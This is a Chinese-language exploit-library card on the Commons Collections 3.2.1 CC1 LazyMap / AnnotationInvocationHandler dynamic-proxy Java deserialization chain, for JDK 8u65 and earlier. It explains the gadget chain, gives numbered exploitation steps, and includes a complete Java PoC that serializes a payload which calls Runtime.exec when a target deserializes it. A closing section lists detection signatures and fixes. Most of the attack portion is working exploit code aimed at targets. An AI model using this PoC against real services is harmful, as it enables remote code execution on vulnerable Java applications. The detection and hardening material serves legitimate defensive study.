---
id: web-java-deser-commonscollections-cc1-lazymap-proxy
title: CC1 LazyMap + AnnotationInvocationHandler 动态代理触发链
type: scenario
domain: web
path: web/java/deserialization
technique: cc1-lazymap-invocationhandler-proxy
aliases:
- CC1 LazyMap 链
- CC1 动态代理链
- AnnotationInvocationHandler 代理触发
- LazyMap ChainedTransformer
- Commons Collections LazyMap 反序列化
tags:
- java
- deserialization
- gadget
- commons-collections
- cc1
- lazymap
- dynamic-proxy
- annotationinvocationhandler
- jdk8
cve: []
severity: high
confidence: high
status: verified
affected_versions: Commons Collections 3.2.1；JDK 8u65（原文构建/测试环境）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V20
  verified_at: '2026-11-05T02:18:09+08:00'
  notes: 已通读原文并逐张核对11张图：图02/03 InvokerTransformer.transform 反射调用与构造器、图05 ChainedTransformer 串行 transform、图06 ConstantTransformer 返回 iConstant、图08 LazyMap.get containsKey→factory.transform、图10 invoke 方法名分流→memberValues.get、图11 readObject 遍历 memberValues.entrySet() 均与卡内原理一致；四段 Transformer 数组与原文 PoC 相同。affected_versions 保留 Commons Collections 3.2.1 / JDK 8u65，原文为构建/测试环境，卡内已注明；失效边界（8u71+、CC 3.2.2+）正确。PoC 未在本机执行；frontmatter 无 sources/source_url。
---

## 一句话结论

当 classpath 存在 Commons Collections 3.2.1 且 JDK 的 `AnnotationInvocationHandler.readObject()` 仍会遍历 `memberValues.entrySet()`（8u65 及更早）时，把 `LazyMap`（factory 为 `ChainedTransformer`）塞进内层 `AnnotationInvocationHandler` 的 `memberValues`，再用它包装成 `Map` 动态代理作为外层 `AnnotationInvocationHandler` 的 `memberValues`；反序列化外层对象时 `readObject` 调用代理的 `entrySet()`，经 `invoke` → `LazyMap.get` → `ChainedTransformer` → `InvokerTransformer` 反射执行 `Runtime.exec`。

## 原理

- **sink 段**：`InvokerTransformer.transform(Object input)` 执行 `input.getClass().getMethod(iMethodName, iParamTypes).invoke(input, iArgs)`，方法名、参数类型、参数三个字段都由构造器传入，因此等价于任意反射调用。`ConstantTransformer.transform` 无视入参、恒返回成员 `iConstant`；`ChainedTransformer.transform` 顺序对数组中的每个 Transformer 调用 `transform`，并把上一个返回值作为下一个的入参。四段组合即 `ConstantTransformer(Runtime.class)` → `InvokerTransformer("getMethod", …, "getRuntime")` → `InvokerTransformer("invoke", …)` → `InvokerTransformer("exec", "calc")`。
- **为什么需要 ConstantTransformer**：第一跳的入参本应由调用方提供，不可控；把它放在链首即可丢弃真实入参、注入 `Runtime.class`，使后续 `getMethod("getRuntime")` 有合法接收者。
- **传导入口**：`LazyMap.get(key)` 在 `map.containsKey(key) == false` 时执行 `value = factory.transform(key)` 并写回 map；`LazyMap.decorate(map, factory)` 把可控 `Transformer` 设为 `factory`。只要 key 不在底层 map 中，`get` 就会进入 Transformer 链，链本身不依赖 key 的实际取值。
- **从 LazyMap.get 到反序列化**：`sun.reflect.annotation.AnnotationInvocationHandler` 实现 `InvocationHandler`，其 `invoke(proxy, method, args)` 对方法名做了分流：`equals`、`toString`、`hashCode`、`annotationType` 单独处理，带参数的方法直接抛 `AssertionError`，其余零参方法执行 `memberValues.get(member)`。把该 handler 的 `memberValues` 设为恶意 `LazyMap`，则任意非特判的零参方法调用等价于 `LazyMap.get(方法名)`。
- **触发代理**：外层 `AnnotationInvocationHandler.readObject()` 会执行 `for (Map.Entry<String,Object> e : memberValues.entrySet())`。若外层 `memberValues` 是一个以 `Map` 为接口、以上述内层 handler 为调用处理器的动态代理，则 `entrySet()` 不是特判方法，被转发到内层 `invoke`，进而调用 `memberValues.get("entrySet")`（内层 handler 的 `memberValues` 才是 LazyMap），触发整条链。内层/外层两个 `memberValues` 是不同对象（外层是代理，内层是 LazyMap），这是该链最容易混淆的点。
- 构造器校验：`AnnotationInvocationHandler(Class type, Map memberValues)` 要求 `type.isAnnotation()`、`type.getInterfaces()` 恰好只有 `java.lang.annotation.Annotation`，`Override.class` 满足。
- 失效边界：JDK 8u71+ 的 `readObject` 改为新建 `LinkedHashMap` 并逐步 `put`，不再对原 `memberValues` 调用 `entrySet()`，该触发段断开；Commons Collections 3.2.2+ 在 `InvokerTransformer.readObject` 中调用 `checkUnsafeSerialization` 抛异常，sink 段也被禁用。

## 触发条件

- classpath 含 Commons Collections 3.2.1（`LazyMap`、`ChainedTransformer`、`InvokerTransformer` 可序列化且未被禁用）。
- JDK 为 8u65 及更早（`AnnotationInvocationHandler.readObject` 直接遍历 `memberValues.entrySet()`）；原文构建/测试环境为 JDK 8u65。
- 目标存在 Java 原生反序列化入口，且未部署 JEP 290 `ObjectInputFilter` 或类白名单。
- `Runtime.exec` 未被 SecurityManager 策略阻断（现代 JDK 默认不启用 SecurityManager 时通常可执行）。

## 利用步骤

1. 构造 `Transformer[]`：`ConstantTransformer(Runtime.class)`、`InvokerTransformer("getMethod")`、`InvokerTransformer("invoke")`、`InvokerTransformer("exec")`。
2. 用 `new ChainedTransformer(transformers)` 包装；`HashMap` 作底层 map，`LazyMap.decorate(map, chainedTransformer)` 得到恶意 LazyMap。
3. 反射取 `sun.reflect.annotation.AnnotationInvocationHandler(Class, Map)` 构造器并 `setAccessible(true)`；用 `Override.class` 与恶意 LazyMap 实例化，得到内层 handler。
4. 用 `Proxy.newProxyInstance(..., new Class[]{Map.class}, innerHandler)` 生成 `Map` 动态代理。
5. 再次用同一构造器、`Override.class` 与代理对象实例化外层 `AnnotationInvocationHandler`；序列化该外层对象。
6. 将序列化字节发送到目标反序列化入口；目标执行 `readObject` → 代理 `entrySet()` → `invoke` → `LazyMap.get` → `ChainedTransformer` → `Runtime.exec`。

## PoC

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1LazyMap {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, null}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"calc"})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), chain);

        Class<?> aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> ctor = aih.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);

        // 内层 handler：memberValues 才是 LazyMap
        InvocationHandler inner = (InvocationHandler) ctor.newInstance(Override.class, lazyMap);
        // 外层 memberValues 是 Map 动态代理
        Map proxyMap = (Map) Proxy.newProxyInstance(
            ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, inner);
        // 外层 handler：反序列化时 readObject 调 memberValues.entrySet()
        InvocationHandler outer = (InvocationHandler) ctor.newInstance(Override.class, proxyMap);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(outer);
        }
        // 目标反序列化 bos.toByteArray() 时执行 calc
    }
}
```

```text
# 预期：目标反序列化时弹出计算器 / 执行指定命令
# 原文另附 serialize/unserialize 工具类做本地验证，未执行
```

## 变体与关联

- 同族触发变体：`TransformedMap` + `AnnotationInvocationHandler`（CC1 的另一种入口，直接依靠 `Map.Entry.setValue`，见关联卡）；CC5 用 `BadAttributeValueExpException.toString` 触发 LazyMap；CC6 用 `HashMap` + `TiedMapEntry.hashCode` 触发 LazyMap；CC7 用 `Hashtable.reconstitutionPut` + `AbstractMap.equals` 触发 LazyMap。本条的区别在“`readObject` → 动态代理 `entrySet()` → `invoke` → `LazyMap.get`”这一跳。
- sink 变体：把 `exec` 换成 `ProcessBuilder`、文件写入、类加载等；`InvokerTransformer` 可调用任意方法。
- 兼容性变体：JDK 8u71+ 改用 CC6/CC3；CC 3.2.2+ 改用 `TemplatesImpl`/`InstantiateTransformer` 或应用自带反射工具类。
- 关联：[[web-java-deser-commonscollections-cc1-transformedmap]]、[[web-java-deser-commonscollections-cc5-badattribute-tostring]]、[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]、[[web-java-deser-commonscollections-cc7-hashtable-equals-lazymap]]。
- 边界：JEP 290 过滤器、类白名单、JDK 8u71+、CC 3.2.2+ 任一成立即失效；动态代理要求目标 JVM 允许生成 `Map` 代理类。

## 检测与防御

- 检测：反序列化流中出现 `LazyMap`、`ChainedTransformer`、`InvokerTransformer`、`ConstantTransformer`、`sun.reflect.annotation.AnnotationInvocationHandler`，以及 `$Proxy` + 上述组合；运行时监控 `readObject` 后紧接 `LazyMap.get`/`ChainedTransformer.transform` 的调用栈与子进程创建。
- 修复：升级 Commons Collections 到 3.2.2+ 并保持 unsafe serialization 关闭；升级 JDK 到 8u71+；消除不可信 Java 原生反序列化。
- 加固：JEP 290 `ObjectInputFilter` 白名单/黑名单；禁止业务反序列化流中出现 JDK 内部注解类与动态代理类；对反序列化入口做签名、来源与类型校验。
